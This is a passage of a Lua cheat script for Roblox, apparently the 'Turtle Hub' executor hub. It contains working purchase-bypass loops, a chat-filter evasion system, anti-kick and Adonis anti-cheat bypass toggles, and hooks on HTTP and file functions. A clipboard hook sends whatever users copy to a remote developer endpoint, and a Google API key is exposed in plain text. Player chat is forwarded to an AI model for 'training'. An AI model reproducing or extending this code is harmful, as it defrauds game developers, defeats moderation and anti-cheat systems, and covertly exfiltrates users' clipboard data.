					lib:BypassPurchase('game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,' .. pass .. ')')
				end)
			end)
			task.wait()
		end
		local endtickcc = tick()
		local durationxd = endtickcc - starttickcc
		lib:notify(lib:ColorFonts(lib:ColorFonts(`Successfully bypassed in {durationxd} seconds`,"Bold"),"Green"),10)
	end)

	Tab02:Toggle("Auto bypass all purchase signals",false,function(value)
		handle.gamepass.loop2 = value
		while wait() do
		if handle.gamepass.loop2 == true then break end
			for i,pass in pairs(gproductIds) do
				lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. pass .. ',true)')
				lib:BypassPurchase('game:GetService("MarketplaceService"):PlayerOwnsAsset(game.Players.LocalPlayer.UserId,' .. pass .. ')')
				lib:BypassPurchase('game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,' .. pass .. ')')
			end
		end
	end)
	]]

	local consoleLibrary = window:Tab("Console")
	local error_output = 0
	local warning = 0
	local output = 0
	local system_message = ""
	local inform_msg = 0
	local TurtleConsole = consoleLibrary:Label(`Turtle Built-in Console : {lib:ColorFonts(output,"Bold,White")} • {lib:ColorFonts(warning,"Bold,Yellow")} • {lib:ColorFonts(error_output,"Bold,Red")} • {lib:ColorFonts(inform_msg,"Bold,Sky Blue")}`)
	
	LogService["MessageOut"]:Connect(function(msg,msgtype)
		if msgtype == Enum.MessageType.MessageOutput then
			output = output + 1
			system_message = system_message .. "\n[" .. lib:ColorFonts("OUTPUT","Bold,White") .. "] " .. msg
		elseif msgtype == Enum.MessageType.MessageWarning then
			warning = warning + 1
			system_message = system_message .. "\n[" .. lib:ColorFonts("WARNING","Bold,Yellow") .. "] " .. msg
		elseif msgtype == Enum.MessageType.MessageError then
			error_output = error_output + 1
			system_message = system_message .. "\n[" .. lib:ColorFonts("ERROR","Bold,Red") .. "] " .. msg
		elseif msgtype == Enum.MessageType.MessageInfo then
			inform_msg = inform_msg + 1
			system_message = system_message .. "\n[" .. lib:ColorFonts("INFO","Bold,Sky Blue") .. "] " .. msg
		end
		if output > 50 then
			inform_msg = 0
			warning = 0
			error_output = 0
			output = 0
			system_message = ""
		elseif warning > 50 then
			inform_msg = 0
			warning = 0
			error_output = 0
			output = 0
			system_message = ""
		elseif error_output > 50 then
			inform_msg = 0
			warning = 0
			error_output = 0
			output = 0
			system_message = ""
		elseif inform_msg > 50 then
			inform_msg = 0
			warning = 0
			error_output = 0
			output = 0
			system_message = ""
		end
		TurtleConsole:EditLabel(`Turtle Built-in Console : {lib:ColorFonts(output,"Bold,White")} • {lib:ColorFonts(warning,"Bold,Yellow")} • {lib:ColorFonts(error_output,"Bold,Red")} • {lib:ColorFonts(inform_msg,"Bold,Sky Blue")}\n{system_message}`)
	end)

	local function replace(str,find_str,replace_str)
		local escaped_find_str = find_str:gsub("[%-%^%$%(%)%%%.%[%]%*%+%-%?]","%%%0")
		return str:gsub(escaped_find_str,replace_str)
	end
	
	local function filter(message)
		for search,replacement in pairs(letters) do 
			message = replace(message,search,replacement)
        	end
        	return message
	end

	local function filter2(message)
		for search,replacement in pairs(letters2) do 
			message = replace(message,search,replacement)
        	end
        	return message
	end
	
	local chatbypass = window:Tab("Chat Bypass")
	local texthandler = "Text bypass preview"
	local WordPreview = chatbypass:Label(lib:ColorFonts("Text bypass preview","Bold,Green"))
	local AutomaticBypass = false
	local V2Bypass = false
	local textboxhandler = nil

	if TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService then
		textboxhandler = chatbypass:Textbox("Insert ur text here.",false,function(value)
			texthandler = value
		end,200)
	else
		textboxhandler = chatbypass:Textbox("Insert ur text here.",false,function(value)
			texthandler = value
		end,1000)
	end

	chatbypass:Toggle("V2 Bypass",true,function(value)
		V2Bypass = value
		if value == true then
			if Chat:FilterStringForBroadcast(filter2(texthandler),LocalPlayer) ~= filter2(texthandler) then
				WordPreview:EditLabel(lib:ColorFonts("Tags! No one can see it.","Bold,Red"))
			else
				WordPreview:EditLabel(lib:ColorFonts(filter2(texthandler),"Bold,Green"))
			end
		else
			if Chat:FilterStringForBroadcast(filter(texthandler),LocalPlayer) ~= filter(texthandler) then
				WordPreview:EditLabel(lib:ColorFonts("Tags! No one can see it.","Bold,Red"))
			else
				WordPreview:EditLabel(lib:ColorFonts(filter(texthandler),"Bold,Green"))
			end
		end
	end)

	chatbypass:Button("Send",function()
		if V2Bypass == true then
			lib:sendChat(filter2(texthandler))
		else
			lib:sendChat(filter(texthandler))
		end
	end)

	lib:DeveloperAccess(function()
		chatbypass:Button("Ubah karakter menjadi karakter normal",function()
			local result = ""

			for i = 1,#filter2(texthandler) do
				local byte = string.byte(filter2(texthandler),i)
				result = result .. string.char(byte)
			end
			
			lib:Copy(result)
		end)

		chatbypass:Button("Ubah semua karakter menjadi karakter normal",function()
			local result = ""

			for search,replacement in pairs(letters2) do
				for i = 1,#replacement do
					local byte = string.byte(replacement,i)
					result = result .. string.char(byte)
				end
			end
				
			lib:Copy(result)
		end)
	end)
	
	chatbypass:Toggle("Automatic bypass",false,function(value)
		AutomaticBypass = value
	end)
	--[[game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer(msg,"All")
	if TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService then
		hookfunc(game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"].FireServer,function(args)
			if AutomaticBypass == true then
				if V2Bypass == true then
					args[1] = filter2(args[1])
					args[2] = "All"
				else
					args[1] = filter(args[1])
					args[2] = "All"
				end
			else
				args[1] = args[1]
				args[2] = "All"
			end
		end)
	else
		hookfunc(TextChatService["ChatInputBarConfiguration"]["TargetTextChannel"].SendAsync,function(args)
			if AutomaticBypass == true then
				if V2Bypass == true then
					args[1] = filter2(args[1])
				else
					args[1] = filter(args[1])
				end
			else
				args[1] = args[1]
			end
		end)
	end]]
	
	textboxhandler:GetInputChanged(function(value)
		if V2Bypass == true then
			if Chat:FilterStringForBroadcast(filter2(value),LocalPlayer) ~= filter2(value) then
				WordPreview:EditLabel(lib:ColorFonts("Tags! No one can see it.","Bold,Red"))
			else
				WordPreview:EditLabel(lib:ColorFonts(`{filter2(value)}\n\nCharacter Used : {#filter2(value)}`,"Bold,Green"))
			end
		else
			if Chat:FilterStringForBroadcast(filter(value),LocalPlayer) ~= filter(value) then
				WordPreview:EditLabel(lib:ColorFonts("Tags! No one can see it.","Bold,Red"))
			else
				WordPreview:EditLabel(lib:ColorFonts(`{filter(value)}\n\nCharacter Used : {#filter(value)}`,"Bold,Green"))
			end
		end
	end)

	local logsystem = window:Tab("Chatlog")
	local chathandling = ""
	local ChatHndlingSystem = logsystem:Label(lib:ColorFonts("","Bold,Green"))
	local httploggingint = window:Tab("Logs")
	local loglistsys = ""
	local loghttpsys = httploggingint:Label("HttpRequest & HttpGet is null")
	
	lib:GetPlayerMessage(LocalPlayer,function(msg)
		chathandling = chathandling .. "\n[" .. (LocalPlayer.Team and lib:ColorFonts(LocalPlayer.Team,"Bold," .. LocalPlayer.TeamColor) or lib:ColorFonts("None","Bold,White")) .. "] " .. LocalPlayer.DisplayName .. " : " .. msg
		ChatHndlingSystem:EditLabel(chathandling)
		if msg:sub(1,1) == ";" then
			if msg:sub(2,5) == "del" then
				chathandling = ""
				loglistsys = ""
				ChatHndlingSystem:EditLabel(chathandling)
				loghttpsys:EditLabel(loglistsys)
			end
		elseif msg:sub(1,4) == "/e ;" then
			if msg:sub(5,8) == "del" then
				chathandling = ""
				loglistsys = ""
				ChatHndlingSystem:EditLabel(chathandling)
				loghttpsys:EditLabel(loglistsys)
			end
		end
	end)
	
	lib:GetPlayer(function(v)
		lib:GetPlayerMessage(v,function(msg)
			chathandling = chathandling .. "\n[" .. (v.Team and lib:ColorFonts(v.Team,"Bold," .. v.TeamColor) or lib:ColorFonts("None","Bold,White")) .. "] " .. v.DisplayName .. " : " .. msg
			ChatHndlingSystem:EditLabel(chathandling)
		end)
	end)

	lib.onPlayerJoin(function(value)
		lib:GetPlayerMessage(value,function(msg)
			chathandling = chathandling .. "\n[" .. (value.Team and lib:ColorFonts(value.Team,"Bold," .. value.TeamColor) or lib:ColorFonts("None","Bold,White")) .. "] " .. value.DisplayName .. " : " .. msg
			ChatHndlingSystem:EditLabel(chathandling)
		end)
	end)

	Network.ConnectionAccepted:Connect(function(Server,ReplicatorInstance)
		--_G.Server = Server:gsub("|", ":")
		loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("NetworkClient","Bold,Red") .. "] " .. lib:ColorFonts(lib:ColorFonts(`Server : {Server:gsub("|",":")}, ReplicatorInstance : {tostring(ReplicatorInstance)}, Replicator Type : {typeof(ReplicatorInstance)}`,"Underline"),"Bold,Sky Blue")
		loghttpsys:EditLabel(loglistsys)
	end)
	
	--[[
	local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
	]]
	local old
	local blacklist_webhook = turtle.getwebhook
	local blacklist_api = {"https://api.turtlereq.com/request/server","https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=AIzaSyCZ44rYeiNgUeptIzDFfllKHAdf9yKrVcU"}
	local blockedWebhook = {}
	local IgnoredWebhook = turtle.getwebhook
	local blockedApi = {}
	local IgnoredLocalAPI = {}
	old = hookfunction(http,newcclosure(function(newreq)
		if newreq.Url:find("webhook") and newreq.Url:find("discord") then
			if newreq.Url:sub(1,#newreq.Url) == blacklist_webhook[table.find(blacklist_webhook,newreq.Url)] then
				loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("HttpRequest","Bold,Red") .. "] " .. lib:ColorFonts("This http is blocked by Turtle-Tamper.","Bold,Red")
				loghttpsys:EditLabel(loglistsys)
			else
				if #blockedWebhook > 0 then
					if newreq.Url == blockedWebhook[table.find(blockedWebhook,newreq.Url)] then
						loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("HttpRequest","Bold,Red") .. "] " .. lib:ColorFonts(lib:ColorFonts("BLOCKED WEBHOOK","Underline"),"Bold,Sky Blue")
						loghttpsys:EditLabel(loglistsys)
						return 
					else
						if newreq.Url:sub(1,#newreq.Url) ~= IgnoredWebhook[table.find(IgnoredWebhook,newreq.Url)] then
							TurtleScreenNotify("⚠️ SUSPICIOUS WEBHOOK ⚠️","WE HAVE DETECTED THE EXISTENCE OF A SUSPICIOUS WEBHOOK FROM THE SCRIPT YOU ARE RUNNING!\n\nWebhook : " .. tostring(newreq.Url) .. "\n\nContinue? (PRESSING THE 'CONTINUE' BUTTON WILL BLOCKING WEBHOOK ACCESS)",{"Continue","Ignore This Webhook"},nil,{
								Continue = function()
									lib:AddTable(tostring(newreq.Url),blockedWebhook)
									--return 
								end,
								["Ignore This Webhook"] = function()
									lib:AddTable(newreq.Url:sub(1,#newreq.Url),IgnoredWebhook)
								end
							})
						end
						loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("HttpRequest","Bold,Red") .. "] " .. lib:ColorFonts(lib:ColorFonts(tostring(newreq.Url),"Underline"),"Bold,Sky Blue")
						loghttpsys:EditLabel(loglistsys)
					end
				else
					if newreq.Url:sub(1,#newreq.Url) ~= IgnoredWebhook[table.find(IgnoredWebhook,newreq.Url)] then
						TurtleScreenNotify("⚠️ SUSPICIOUS WEBHOOK ⚠️","WE HAVE DETECTED THE EXISTENCE OF A SUSPICIOUS WEBHOOK FROM THE SCRIPT YOU ARE RUNNING!\n\nWebhook : " .. tostring(newreq.Url) .. "\n\nContinue? (PRESSING THE 'CONTINUE' BUTTON WILL BLOCKING WEBHOOK ACCESS)",{"Continue","Ignore This Webhook"},nil,{
							Continue = function()
								lib:AddTable(tostring(newreq.Url),blockedWebhook)
								--return 
							end,
							["Ignore This Webhook"] = function()
								lib:AddTable(tostring(newreq.Url),IgnoredWebhook)
							end
						})
					end
					loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("HttpRequest","Bold,Red") .. "] " .. lib:ColorFonts(lib:ColorFonts(tostring(newreq.Url),"Underline"),"Bold,Sky Blue")
					loghttpsys:EditLabel(loglistsys)
				end
			end
		elseif newreq.Url:find("api") or newreq.Url:find("Api") and not newreq.Url:find("api.github.com") then
			if newreq.Url:sub(1,#newreq.Url) == blacklist_api[table.find(blacklist_api,newreq.Url)] then
				loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("HttpRequest","Bold,Red") .. "] " .. lib:ColorFonts("This http is blocked by Turtle-Tamper.","Bold,Red")
				loghttpsys:EditLabel(loglistsys)
			else
				if #blockedApi > 0 then
					if newreq.Url == blockedApi[table.find(blockedApi,newreq.Url)] then
						loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("HttpRequest","Bold,Red") .. "] " .. lib:ColorFonts(lib:ColorFonts("BLOCKED API","Underline"),"Bold,Sky Blue")
						loghttpsys:EditLabel(loglistsys)
						return 
					else
						if newreq.Url ~= IgnoredLocalAPI[table.find(IgnoredLocalAPI,newreq.Url)] then
							TurtleScreenNotify("⚠️ SUSPICIOUS API ⚠️","WE HAVE DETECTED THE EXISTENCE OF A SUSPICIOUS API FROM THE SCRIPT YOU ARE RUNNING!\n\API : " .. tostring(newreq.Url) .. "\n\nContinue? (PRESSING THE 'CONTINUE' BUTTON WILL BLOCKING API ACCESS)",{"Continue","Ignore This Local-API"},nil,{
								Continue = function()
									lib:AddTable(tostring(newreq.Url),blockedApi)
									--return 
								end,
								["Ignore This Local-API"] = function()
									lib:AddTable(tostring(newreq.Url),IgnoredLocalAPI)
								end
							})
						end
						loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("HttpRequest","Bold,Red") .. "] " .. lib:ColorFonts(lib:ColorFonts(tostring(newreq.Url),"Underline"),"Bold,Sky Blue")
						loghttpsys:EditLabel(loglistsys)
					end
				else
					if newreq.Url ~= IgnoredLocalAPI[table.find(IgnoredLocalAPI,newreq.Url)] then
						TurtleScreenNotify("⚠️ SUSPICIOUS API ⚠️","WE HAVE DETECTED THE EXISTENCE OF A SUSPICIOUS API FROM THE SCRIPT YOU ARE RUNNING!\n\API : " .. tostring(newreq.Url) .. "\n\nContinue? (PRESSING THE 'CONTINUE' BUTTON WILL BLOCKING API ACCESS)",{"Continue","Ignore This Local-API"},nil,{
							Continue = function()
								lib:AddTable(tostring(newreq.Url),blockedApi)
								--return 
							end,
							["Ignore This Local-API"] = function()
								lib:AddTable(tostring(newreq.Url),IgnoredLocalAPI)
							end
						})
					end
					loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("HttpRequest","Bold,Red") .. "] " .. lib:ColorFonts(lib:ColorFonts(tostring(newreq.Url),"Underline"),"Bold,Sky Blue")
					loghttpsys:EditLabel(loglistsys)
				end
			end
		end
		return old(newreq)
	end))


	if setclipboard then
		local clipb1
		clipb1 = hookfunction(setclipboard,newcclosure(function(...)
			local arg = {...}
			loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("Clipboard","Bold,Red") .. "] " .. lib:ColorFonts(table.concat(arg,", "),"Bold,Green")
			loghttpsys:EditLabel(loglistsys)
			lib:DeveloperAccess(function()
				if TurtleFlags.DisableClipboardLogger == false then
					lib.sentMessage(
						lib.getTable("sent","galau"),
						`{lib.parseData(arg,0,false,{},nil,false)}`,
						{}
					)
				end
			end)
			return clipb1(...)
		end))
	elseif toclipboard then
		local clipb2
		clipb2 = hookfunction(toclipboard,newcclosure(function(...)
			local arg = {...}
			loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("Clipboard","Bold,Red") .. "] " .. lib:ColorFonts(table.concat(arg,", "),"Bold,Green")
			loghttpsys:EditLabel(loglistsys)
			lib:DeveloperAccess(function()
				if TurtleFlags.DisableClipboardLogger == false then
					lib.sentMessage(
						lib.getTable("sent","galau"),
						`{lib.parseData(arg,0,false,{},nil,false)}`,
						{}
					)
				end
			end)
			return clipb2(...)
		end))
	elseif set_clipboard then
		local clipb3
		clipb3 = hookfunction(set_clipboard,newcclosure(function(...)
			local arg = {...}
			loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("Clipboard","Bold,Red") .. "] " .. lib:ColorFonts(table.concat(arg,", "),"Bold,Green")
			loghttpsys:EditLabel(loglistsys)
			lib:DeveloperAccess(function()
				if TurtleFlags.DisableClipboardLogger == false then
					lib.sentMessage(
						lib.getTable("sent","galau"),
						`{lib.parseData(arg,0,false,{},nil,false)}`,
						{}
					)
				end
			end)
			return clipb3(...)
		end))
	elseif (Clipboard and Clipboard.set) then
		local clipb4
		clipb4 = hookfunction((Clipboard and Clipboard.set),newcclosure(function(...)
			local arg = {...}
			loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("Clipboard","Bold,Red") .. "] " .. lib:ColorFonts(table.concat(arg,", "),"Bold,Green")
			loghttpsys:EditLabel(loglistsys)
			lib:DeveloperAccess(function()
				if TurtleFlags.DisableClipboardLogger == false then
					lib.sentMessage(
						lib.getTable("sent","galau"),
						`{lib.parseData(arg,0,false,{},nil,false)}`,
						{}
					)
				end
			end)
			return clipb4(...)
		end))
	else
		lib:notify(lib:ColorFonts("Exploit doesnt have a clipboard vuln","Bold,Red"),9e9)
	end

	local old2
	old2 = hookfunction(game.HttpGet,newcclosure(function(olgame,url)
		if url:find("Sidhsksjsjsh") then
			loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("HttpGet","Bold,Red") .. "] HTTP is protected bcus this url is from Turtle API."
			loghttpsys:EditLabel(loglistsys)
		elseif url:find("keyrblx.com") and url:find("TurtleHub") then
			loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("HttpGet","Bold,Red") .. "] This HTTP is blocked by turtle hub."
			loghttpsys:EditLabel(loglistsys)
		else
			loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("HttpGet","Bold,Red") .. "] " .. tostring(url)
			loghttpsys:EditLabel(loglistsys)
		end
		return old2(olgame,url)
	end))
	
	local old3
	old3 = hookfunction(game.GetObjects,newcclosure(function(...)
		local arg = {...}
		loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("GetObjects","Bold,Red") .. "] " .. lib:ColorFonts(table.concat(arg,", "),"Bold,Green")
		loghttpsys:EditLabel(loglistsys)
		return old3(...)
	end))

	--[[local old3
	old3 = hookfunction(loadstring,newcclosure(function(...)
		local arg = {...}
		loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("loadstring","Bold,Red") .. "] " .. lib:ColorFonts(table.concat(arg,", "),"Bold,Green")
		loghttpsys:EditLabel(loglistsys)
		return old3(...)
	end))]]

	local old4
	old4 = hookfunction(writefile,newcclosure(function(...)
		local arg = {...}
		loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("writefile","Bold,Red") .. "] " .. lib:ColorFonts(table.concat(arg,", "),"Bold,Green")
		loghttpsys:EditLabel(loglistsys)
		return old4(...)
	end))

	local old5
	old5 = hookfunction(isfile,newcclosure(function(...)
		local arg = {...}
		loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("isfile","Bold,Red") .. "] " .. lib:ColorFonts(table.concat(arg,", "),"Bold,Green")
		loghttpsys:EditLabel(loglistsys)
		return old5(...)
	end))

	local old6
	old6 = hookfunction(readfile,newcclosure(function(...)
		local arg = {...}
		loglistsys = loglistsys .. "\n[" .. lib:ColorFonts("readfile","Bold,Red") .. "] " .. lib:ColorFonts(table.concat(arg,", "),"Bold,Green")
		loghttpsys:EditLabel(loglistsys)
		return old6(...)
	end))
	--TurtleScreenNotify("","",{},nil,{})

	local Intelligence = window:Tab("Intelligence")
	local TurtleIntelligenceVersion = "Gemini Advanced"
	local aichatbot = false
	local WhitelistedPlayer = {}
	local SelectedBypassLevel = ""
	local suggestprompt = ""
        local plrname = nil
	local AnimatedText = true
	local IntelligenceResponseHandler = Intelligence:Label("The response from the Turtle-Intelligence will be displayed here")
	local LastResponse = IntelligenceResponseHandler:GetText()
	local function TurtleIntelligenceResponseHandler(msg)
		if TurtleIntelligenceVersion == "Gemini Advanced" then
				local reqstatus,responses = pcall(function()
					return http({
							Url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=AIzaSyCZ44rYeiNgUeptIzDFfllKHAdf9yKrVcU",
							Method = "POST",
							Headers = {
								["content-type"] = "application/json";
								--["Authorization"] = "b1060a52b07c933b192298aede18a4e079e2cb3be98c2bd6fcd30e77c4c80cb9822937927db1797ccc9fdc6804e85777"
							},
							Body = HttpService:JSONEncode({contents = {{parts = {{text = msg}}}}})
						})
				end)
				if aichatbot == true then
					if #WhitelistedPlayer ~= 0 then
						if SelectedBypassLevel == "Bypass 1" then
							lib:sendChat(filter(HttpService:JSONDecode(responses.Body)["candidates"][1]["content"]["parts"][1]["text"]))
						elseif SelectedBypassLevel == "Bypass 2" then
							lib:sendChat(filter2(HttpService:JSONDecode(responses.Body)["candidates"][1]["content"]["parts"][1]["text"]))
						elseif SelectedBypassLevel == "None" then
							lib:sendChat(HttpService:JSONDecode(responses.Body)["candidates"][1]["content"]["parts"][1]["text"])
						end
					else
						lib:ColorFonts(lib:ColorFonts("Whitelist atleast 1 player.","Bold,Red"),10)
					end
				else 
				        if AnimatedText == true then
					    lib.AnimatedText(HttpService:JSONDecode(responses.Body)["candidates"][1]["content"]["parts"][1]["text"],0.001,function(v) --lib.AnimatedText(HttpService:JSONDecode(responses.Body).response,0.001,function(v)
						IntelligenceResponseHandler:EditLabel(lib:ColorFonts(v,"Bold,Green"))
					    end)
				        else
					    IntelligenceResponseHandler:EditLabel(lib:ColorFonts(HttpService:JSONDecode(responses.Body)["candidates"][1]["content"]["parts"][1]["text"],"Bold,Green"))
				        end
				end
		else
			TurtleScreenNotify("Turtle Hub | AI","This version for AI is not available due to API issues.",{},nil,{})
		end
	end

	Intelligence:Textbox("Insert ur prompt",false,function(value)
		if value == "fix lag" then
			IntelligenceResponseHandler:EditLabel(lib:ColorFonts("Fixing lags...","Bold,Red"))
			lib:RevokeLag()
		elseif value:sub(1,12) == "send notify " then
			IntelligenceResponseHandler:EditLabel(lib:ColorFonts("Notification sended","Bold,Red"))
			if value:sub(1,12) == "bar" then
				lib:notify(value:sub(13),10)
			elseif value:sub(1,12) == "popup" then
				TurtleScreenNotify("Turtle Notify",value:sub(13),{},nil,{})
			end
		elseif value == "kill turtle hub" then
			ui:Destroy()
		elseif value:sub(1,5) == "goto " then
			lib:TrackPlayer(value:sub(6),function(v)
				IntelligenceResponseHandler:EditLabel(lib:ColorFonts(`teleporting you to {v.DisplayName} (@{v.Name})`,"Bold,Red"))
				lib:TeleportMethod("tp",v.Character.HumanoidRootPart.CFrame)
			end)
		elseif value:sub(1,8) == "tweento " then
			lib:TrackPlayer(value:sub(9),function(v)
				IntelligenceResponseHandler:EditLabel(lib:ColorFonts(`tweening you to {v.DisplayName} (@v.Name)`,"Bold,Red"))
				lib:TeleportMethod("tween",v.Character.HumanoidRootPart.CFrame)
			end)
		else
			TurtleIntelligenceResponseHandler(value)
			LastResponse = IntelligenceResponseHandler:GetText()
		end
	end)
	--IntelligenceResponseHandler:GetText()
	Intelligence:Dropdown("Select Turtle-Intelligence version",{"Gemini Advanced","N/A","N/A"},function(value)
		TurtleIntelligenceVersion = value
	end)
	
	lib:DeveloperAccess(function()
		Intelligence:Toggle("Animated Text",true,function(value)
			AnimatedText = value
		end)
	end)

	Intelligence:Button("Copy Response",function()
		lib:Copy(IntelligenceResponseHandler:GetText())
	end)
	
	Intelligence:Toggle("Chatbot",false,function(value)
		aichatbot = value
	end)
	
	Intelligence:Dropdown("Chatbot bypass chat filter level",{"None","Bypass 1","Bypass 2"},function(value)
		SelectedBypassLevel = value
	end)
	
	Intelligence:Textbox("Whitelisted player",false,function(value)
		lib:TrackPlayer(value,function(v)
			lib:AddTable(v.DisplayName,WhitelistedPlayer)
			lib:notify(lib:ColorFonts("Player successfully whitelisted.",""),10)
			IntelligenceResponseHandler:EditLabel(lib:ColorFonts("Currently whitelisted player : " .. table.concat(WhitelistedPlayer,", "),"Bold,Green"))
			wait(5)
			IntelligenceResponseHandler:EditLabel(lib:ColorFonts(LastResponse,"Bold,Green"))
		end)
	end)

	Intelligence:Label(lib:ColorFonts("We will use your " .. lib:ColorFonts("message data","Red") .. " to train our chatbot model","Bold,Green"))
	Intelligence:Label("Turtle-Intelligence is our 5th AI, and we will need the message data you send to train our chatbot")
	lib:GetPlayer(function(v)
		lib:GetPlayerMessage(v,function(msg)
	                plrname = v.Name
			if table.find(WhitelistedPlayer,v.DisplayName) then
				TurtleIntelligenceResponseHandler(msg)
			end
		end)
	end)

	lib.onPlayerJoin(function(value)
		lib:GetPlayerMessage(value,function(msg)
			plrname = value.Name
			if table.find(WhitelistedPlayer,value.DisplayName) then
				TurtleIntelligenceResponseHandler(msg)
			end
		end)
	end)

	lib.onPlayerLeft(function(plr)
		if table.find(WhitelistedPlayer,plr.DisplayName) then
			task.spawn(function()
				table.remove(WhitelistedPlayer,table.find(WhitelistedPlayer,plr.DisplayName))
				IntelligenceResponseHandler:EditLabel(lib:ColorFonts("Currently whitelisted player : " .. table.concat(WhitelistedPlayer,", "),"Bold,Green"))
				wait(5)
				IntelligenceResponseHandler:EditLabel(lib:ColorFonts(LastResponse,"Bold,Green"))
			end)
		end
	end)

	local jajsjsjsjsjskaeiwjsoqhsksbqkskanswbsakmlllkkkLLL = window:Tab("Credits")
	jajsjsjsjsjskaeiwjsoqhsksbqkskanswbsakmlllkkkLLL:Label(`lib:ColorFonts("This script were developed by\n• Fahri [ OWNER ]\n• Izatul\n• Farhan\n• Naufal\n• Fadil\n• Rasyid\n• Pasya\n• Ikbal\n• Reza\n• Wahyu\n• Wisnu\n• Akmal\n\nThey're the real admin & staff since turtle hub was released to public.","Bold,Sky Blue")`)

	LocalPlayer.Idled:connect(function()
		if TurtleFlags.BypassDetection == true then
			VirtualUser:CaptureController()
			VirtualUser:ClickButton2(Vector2.new())
			lib:notify(lib:ColorFonts("[ Vanguard ] Bypassed AFK Detection in Client","Bold,Red"),100)
		end
	end)

	local tamperbypassreplicate = window:Tab("Bypass")
	tamperbypassreplicate:Toggle("Bypass Detection",false,function(value)
		TurtleFlags.BypassDetection = value
		if value == true then
			if RunningVanguard.SystemDetectionProtector == false then
				lib:BypassKick()
			end
		end
	end,"This including anti kick and anti afk")

	tamperbypassreplicate:Toggle("Bypass Adonis Detection",false,function(value)
		TurtleFlags.BypassAdonisDetection = value
		if value == true then
			if RunningVanguard.AdonisDetection == false then
				lib:ACPatch()
			end
		end
	end,"Adonis Only")

	tamperbypassreplicate:Toggle("Bypass Adonis Client Kill/Crash",false,function(value)
		TurtleFlags.AdonisClientKillBypass = value
		if value == true then
			if RunningVanguard.AdonisDetection == false then
				lib:ACPatch()
			end
		end
	end,"Adonis Only")

	tamperbypassreplicate:Toggle("Bypass Adonis Anti Cheat Flags",false,function(value)
		TurtleFlags.AdonisACFlagBypass = value
		if value == true then
			if RunningVanguard.AdonisDetection == false then
				lib:ACPatch()
			end
		end
	end,"Adonis Only")

	tamperbypassreplicate:Toggle("Other Adonis Bypass",false,function(value)
		TurtleFlags.AdonisVulnBypass = value
		if value == true then
			if RunningVanguard.Vulns == false then
				lib:VulnsBypass()
			end
		end
	end,"Adonis Only") --turtle.sys.GameplayPaused(false)

	tamperbypassreplicate:Toggle("Bypass Gameplay Paused",false,function(value)
		TurtleFlags.BypassAnnoyPopup = value
	end)

	tamperbypassreplicate:Toggle("Disable clipboard logger",false,function(value)
		TurtleFlags.DisableClipboardLogger = value
	end)

	lib:Loop(function()
		if TurtleFlags.BypassAnnoyPopup == true then
			turtle.sys.GameplayPaused(false)
		end
	end)
	
	lib:DeveloperAccess(function()
		local selectionBox = Instance.new("SelectionBox")
		selectionBox.Name = lib.randomString()
		selectionBox.Color3 = Color3.new(255,255,255)
		selectionBox.Adornee = nil
		selectionBox.Parent = lib.Interface("hide")

		local selected = Instance.new("SelectionBox")
		selected.Name = lib.randomString()
		selected.Color3 = Color3.new(0,166,0)
		selected.Adornee = nil
		selected.Parent = lib.Interface("hide")

		local ActivateHighlight = nil
		local ClickSelect = nil

			
		local function CatchCaller(func,output)
			task.spawn(function()
				lib:ErrorReader(function()
					local old = hookfunction(func,newcclosure(function(...)
						local args = {...}
						for i,v in next,args do
							output(#args,i,v)
						end
						return old(...)
					end))
				end)
			end)
		end

		local TpToolDecal = Instance.new("Tool")
		TpToolDecal.Name = "Teleport Tool"
		TpToolDecal.RequiresHandle = true
		TpToolDecal.Parent = game:GetService("ReplicatedStorage")
		TpToolDecal.ToolTip = "Click anywhere to teleport"
		local handleTPDecal = Instance.new("Part")
		handleTPDecal.Name = "Handle"
              	handleTPDecal.Size = Vector3.new(1,1,1)
             	handleTPDecal.BrickColor = BrickColor.new("Bright yellow")
              	handleTPDecal.Anchored = false
              	handleTPDecal.CanCollide = false
              	handleTPDecal.Parent = TpToolDecal
		--[[
		TpToolDecal.Equipped:Connect(function()
			lib:notify(lib:ColorFonts("Tool is ready, click anywhere to teleport","Bold,Green"),20)
		end)
		TpToolDecal.Unequipped:Connect(function()
			lib:notify(lib:ColorFonts("Tool deactivated.","Bold,Red"),20)
		end)
		TpToolDecal.Activated:Connect(function()
			local Char = LocalPlayer.Character or workspace:FindFirstChild(LocalPlayer.Name)
			local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
			if not Char or not HRP then
				lib:notify(lib:ColorFonts("Failed to find HumanoidRootPart","Bold,Red"),10)
			end
			HRP.CFrame = CFrame.new(Mouse.Hit.X,Mouse.Hit.Y + 3,Mouse.Hit.Z,select(4,HRP.CFrame:components()))
		end)
		]]

		local TTWToolDecal = Instance.new("Tool")
		TTWToolDecal.Name = "Tap-To-Walk Tool"
		TTWToolDecal.RequiresHandle = true
